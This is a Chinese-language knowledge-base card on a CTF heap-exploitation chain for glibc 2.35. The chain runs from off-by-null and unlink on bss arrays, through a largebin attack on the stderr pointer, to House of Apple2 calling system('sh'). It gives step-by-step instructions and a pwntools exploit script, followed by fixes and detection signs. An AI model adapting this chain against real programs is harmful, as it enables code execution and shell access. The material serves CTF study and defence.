---
id: binary-pwn-heap-glibc235-offby-null-unlink-bss-size-array-largebin-apple2-stderr
title: glibc 2.35 off-by-null + unlink 劫持 bss chunk/size 数组：改大 size 造堆溢出，largebin attack 改写 stderr 指针 + House of Apple2 执行 system
type: scenario
domain: binary
path: binary/pwn/heap
technique: glibc235-offby-null-unlink-bss-size-array-largebin-apple2-stderr
aliases:
- DASCTF garbage
- off by null unlink 打 bss 数组
- 改 size 数组造堆溢出
- stderr 指针劫持 House of Apple2
- glibc 2.35 unlink + largebin + Apple2
- note 数组 size 数组 bss
tags:
- pwn
- heap
- unlink
- off-by-null
- glibc-2.35
- bss-array
- largebin
- house-of-apple2
- fsop
- stderr
- ctf
cve: []
affected_versions: glibc 2.35
severity: high
confidence: medium
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V631
  verified_at: '2026-11-12T23:45:31+08:00'
  notes: 已对照原文与12张图逐张核对：01-07 how2heap House of Einherjar 演示（tcache 填满、unsorted bin 合并、tcache poisoning）；08 checksec 实测 Full RELRO/Canary/NX/No PIE(0x400000)；09-11 例题 unlink 现场（fake chunk 0x421/fd=0x404048/bk=0x404050、note 数组 0x404060 被写到自身前 0x18、size/byte 数组 0x4040c0 被写成 0x1000）；12 p stderr=0x127da20 且 0x404040 stderr@GLIBC_2.2.5 指针已被改成堆上 fake FILE（' sh;' 开头）。glibc 2.35 为原文明确标注（'一道 2.35 的 off by null & unlink'、'题目的 glibc 版本是 2.35'），affected_versions 设置正确。exp 地址/偏移（target=0x404060、0x4040c0、heap-0x1a61、libc-0x21a161、0x404040-0x20、_IO_wfile_jumps-0x20、_wide_vtable+0x68=system）与原文逐行核对一致。已修正两处：PoC 关键片段补回原文 exp 的 _flags2=1（ljust 0x74），原理中 House of Apple2 分支条件按 _IO_wfile_overflow/_IO_wdoallocbuf 实际检查（_flags 低字节 0x20 + _wide_data->_IO_write_base==0）改写，避免把 _mode/_IO_write_base/_IO_write_ptr 误描述为已设置。dedup 报告 6 候选均判 related/new；最近候选 binary-pwn-heap-glibc235-offby-null-unlink-chunks-array-stack-rop（cos 0.9354）同为 2.35 off-null+unlink 改全局数组，但后链为 __environ 泄栈+ROP，本卡为同时改 size 数组造超长溢出 + largebin 打 stderr
    + Apple2，后链与 PoC 不同，非重复；dup-scan.json 无涉及本篇 pair。跳过项（House of Einherjar 原理与 off-by-one 概念）由既有 verified 卡覆盖，理由成立。未验证点：exp 未在本机复跑。
---

## 一句话结论

在 glibc 2.35、No PIE、无 UAF 的 note 类堆题中，`edit` 读满长度后固定补一个 NUL 形成 off-by-null；以全局 `note[]` 指针数组为锚点伪造 fake chunk，`delete` 触发向后合并的 unlink，把 `note[0]` 改写到数组自身附近；随后一次 `edit(0)` 同时重写 `note[]` 与 `size[]` 两个 bss 数组，把各块 size 改成 0x1000/0x2000，使原本受限的 edit 变成任意长度堆溢出；再借 chunk 重叠泄露 heap/libc，用 largebin attack 把 `stderr` 指针（No PIE 下的 copy relocation/GOT 项）改成堆上 fake FILE，最后用 House of Apple2（`_IO_wfile_jumps-0x20` 主 vtable + `_wide_vtable+0x68=system`）在 IO/退出路径执行 `system("  sh;")`。

## 原理

- **off-by-null 来源**：`vuln_read(a1, a2)` 逐字节读到换行或读满 `a2`，循环结束后无条件执行 `*(char *)(i + a1) = 0`。读满 a2 个字节时 NUL 落在用户区之后第 1 字节，即下一个 chunk 的 `size` 最低字节，清掉 `PREV_INUSE`。
- **unlink 锚点与检查**：高版本 unlink 需要 `chunksize(P) == prev_size(next_chunk(P))` 且 `FD->bk == P && BK->fd == P`。把 fake chunk 放在 chunk 0 用户区，size 设为 0x421（chunksize 0x420），末尾在物理后继的 prev_size 写 0x420 通过一致性检查；令 `fd = &note[0] - 0x18`、`bk = &note[0] - 0x10`，因为 `note[0]` 原本就保存着 chunk 0 的用户指针 P，所以 `FD->bk`、`BK->fd` 都读到 P，双向链表检查通过。
- **unlink 后的数组改写**：unlink 执行 `fd->bk = bk; bk->fd = fd`，两处都落在 `note[0]` 上，最终 `note[0]` 变成 `&note[0]-0x18`；此后 `edit(0, ...)` 从该地址开始写，直接覆盖 bss 上的 `note[]` 与 `size[]`。把 `note[0]` 指回数组附近、`note[1]` 指向 size 数组、并把所有 size 写成 0x1000（随后可再 edit(1) 改成 0x2000），就获得“任意 bss 写 + 超长堆写”。
- **为什么改 size 能放大**：程序的 edit 长度来自 bss 的 size 数组而非 chunk 真实大小；size 被改成 0x1000/0x2000 后，edit 可以把数据写出当前 chunk，覆盖后续 chunk 的头与用户区，构造 chunk 重叠和 largebin 布局。
- **泄露**：用重叠块切换 unsorted/largebin 状态，`show` 读 fd/bk 得到 heap 与 libc 基址（原文偏移：heap `-0x1a61`，libc `-0x21a161`，换 libc 需重算）。
- **largebin attack 打 stderr 指针**：No PIE 下二进制对 `stderr` 的引用是 copy relocation/GOT 项，地址固定（原文 0x404040）。把一个 largebin chunk 的 `bk_nextsize` 设为 `&stderr - 0x20`，插入时 `victim->bk_nextsize->fd_nextsize = victim` 会把该全局指针改写成堆上 victim 地址，即让 `stderr` 指向 fake FILE。
- **House of Apple2 收尾**：fake `_IO_FILE_plus` 的 `_flags` 置为 `"  sh;"` 的字节值（低字节 0x20，未置 `_IO_NO_WRITES`/`_IO_CURRENTLY_PUTTING`），且 `_wide_data->_IO_write_base == 0`，满足 `_IO_wfile_overflow` 的 wide 分支条件后进入 `_IO_wdoallocbuf` 的 `_wide_vtable->__doallocate` 回调；主 vtable 用 `_IO_wfile_jumps - 0x20` 绕过主 vtable 校验并落到 `_IO_wfile_overflow`；`_wide_data` 指向堆上可控区，`_wide_vtable+0x68` 写 `system`，params 处放 `"  sh;"`。程序后续 IO 操作/退出遍历时执行 `system(fp)`。

## 触发条件

- glibc 2.35（TCACHE 开启），No PIE，堆题提供 add/delete/show/edit，`edit` 在读满后多写一个 NUL。
- 全局 `note[]` 指针数组与 `size[]` 数组位于固定 .bss，菜单读写以数组项为目标；数组中原有指向被伪造 chunk 的指针（用于通过 `FD->bk/BK->fd` 检查）。
- 可申请/释放足够大的 chunk（题目允许 0x410–0x900 等尺寸），能把 tcache 填满并布置 unsorted/largebin。
- 能泄露 heap 与 libc；fake FILE 与 `_wide_data/_wide_vtable` 落在可控堆区；`system` 地址已知。

## 利用步骤

1. `checksec`：glibc 2.35、No PIE、Full RELRO、Canary、NX；确认 `edit` 的 off-by-null 与 bss 中 `note[]`、`size[]` 地址（原文 `note=0x404060`、`size=0x4040c0`）。
2. 布置三块：`add(0,0x428)`、`add(1,0x4f0)`、`add(2,0x410)`。
3. 在 chunk 0 写 fake chunk：`p64(0)+p64(0x421)+p64(target-0x18)+p64(target-0x10)`，补齐到 0x420，末尾 `p64(0x420)` 覆盖 chunk 1 的 prev_size；`edit(0, payload)` 的 NUL 清掉 chunk 1 的 PREV_INUSE。
4. `delete(1)` 触发向后合并与 unlink，`note[0]` 被改到 `target-0x18`。
5. `edit(0, b'\x00'*0x18 + p64(target-0x18) + p64(target+0x60) + p64(0)*10 + p32(0x1000)*10)`：重写 `note[]`，把 `note[1]` 指向 size 数组并把所有 size 改成 0x1000。
6. 申请 0x500–0x520 的块并成对释放，构造 largebin；用 `show` 泄露 heap（`-0x1a61`）与 libc（`-0x21a161`）。
7. `edit(1, p32(0x2000)*10)` 把 size 放大到 0x2000；`edit(2, payload)` 越过 chunk 边界构造 largebin attack 元数据，把 `&stderr-0x20` 写入 `bk_nextsize`，使全局 `stderr` 指针被写成 fake FILE 堆地址。
8. `edit(4, ...)` 在堆上布置 fake `_IO_FILE_plus`（含 `"  sh;"`）、fake `_IO_wide_data` 与 `_wide_vtable`（`+0x68=system`），主 vtable 用 `_IO_wfile_jumps-0x20`。
9. 触发程序 IO/退出路径，执行 `system("  sh;")` 拿 shell。

## PoC

原文给出完整 exp；关键阶段（偏移/地址为原题值，未在本机复跑）：

```python
target = 0x404060                      # note[] 数组
add(0, 0x428, b'aaaa'); add(1, 0x4f0, b'aaaa'); add(2, 0x410, b'aaaa')

payload  = p64(0) + p64(0x421) + p64(target - 0x18) + p64(target - 0x10)
payload  = payload.ljust(0x420, b'\x00') + p64(0x420)
edit(0, payload)                       # off-by-null + fake chunk
delete(1)                              # unlink，note[0] -> target-0x18

edit(0, b'\x00'*0x18 + p64(target-0x18) + p64(0x4040c0)
        + p64(0)*10 + p32(0x1000)*10)  # 改写 note[]/size[]

# ... 泄漏 heap/libc（heap=-0x1a61，libc=-0x21a161）...
edit(1, p32(0x2000)*10)                # 放大所有 size
# largebin attack：bk_nextsize = &stderr - 0x20，把 stderr 指针改成 fake FILE
edit(2, b'\x00'*0x418 + p64(0x500) + b'\x00'*0x4f8 + p64(0x420)
        + b'\x00'*0x418 + p64(0x531)
        + p64(0x21a110 + libc.address)*2 + p64(heap_base + 0xfe0)
        + p64(0x404040 - 0x20))

fake_io  = b'  sh;\x00\x00\x00' + p64(0x521)
fake_io  = fake_io.ljust(0x74, b'\x00') + p64(1)          # _flags2
fake_io  = fake_io.ljust(0x88, b'\x00') + p64(heap_base + 0x200)
fake_io  = fake_io.ljust(0xa0, b'\x00') + p64(fake_io_addr + 0x200)
fake_io  = fake_io.ljust(0xd8, b'\x00') + p64(libc.sym['_IO_wfile_jumps'] - 0x20)
fake_io  = fake_io.ljust(0x200, b'\x00') + b'\x00'*0xe0 + p64(fake_io_addr + 0x2e0)
fake_io += b'\x00'*0x60 + p64(libc.sym['system'])
edit(4, b'a'*0x500 + fake_io)
```

## 变体与关联

- how2heap 的 House of Einherjar 原理（off-by-null 清 PREV_INUSE + fake chunk 自指 + tcache poisoning）已在 [[binary-pwn-heap-house-of-einherjar-offby-null-fake-chunk-tcache-poison]] 覆盖；本卡只记录例题的完整链，不重复原语教学。
- 同环境（glibc 2.35）的 off-by-null + unlink 劫持全局 chunk 数组、最终 `__environ` 泄露栈 + ROP 的变体见 [[binary-pwn-heap-glibc235-offby-null-unlink-chunks-array-stack-rop]]；本卡差异是同时劫持 size 数组制造任意长度堆溢出，最终改走 largebin + House of Apple2 打 stderr。
- House of Apple2 的 largebin→`_IO_list_all`/`_wide_vtable` 原理见 [[binary-pwn-heap-house-of-apple2-source-analysis-largebin-system]]；本卡是把 `_IO_list_all` 换成 No PIE 下的 `stderr` 全局指针。
- 变体：若 size 数组不在 bss 或无法一次改写，可分别用 unlink 写指针、再用其它写原语改 size；final 也可用 `_IO_list_all` 代替 `stderr`，或用 environ+ROP（见上）。

## 检测与防御

- 修复：`vuln_read` 读满时不要再补 NUL（或只写到 `a1+a2-1`）；free 后清空指针并校验 size 与 chunk 实际大小一致；对菜单下标/长度做严格边界检查。
- 编译：开启 PIE/ASLR 使 bss 数组与 GOT 地址不可预测；Full RELRO、Canary、NX；safe-linking 只提高门槛。
- 检测：bss 指针数组被指向自身附近、size 记录突然变成 0x1000/0x2000、堆块 size 与记录不一致、largebin 的 `bk_nextsize` 指向 bss、`stderr` 全局指针指向堆区、exit 前出现 fake `_IO_FILE` 与 `_IO_wfile_jumps-0x20`，都是典型特征。
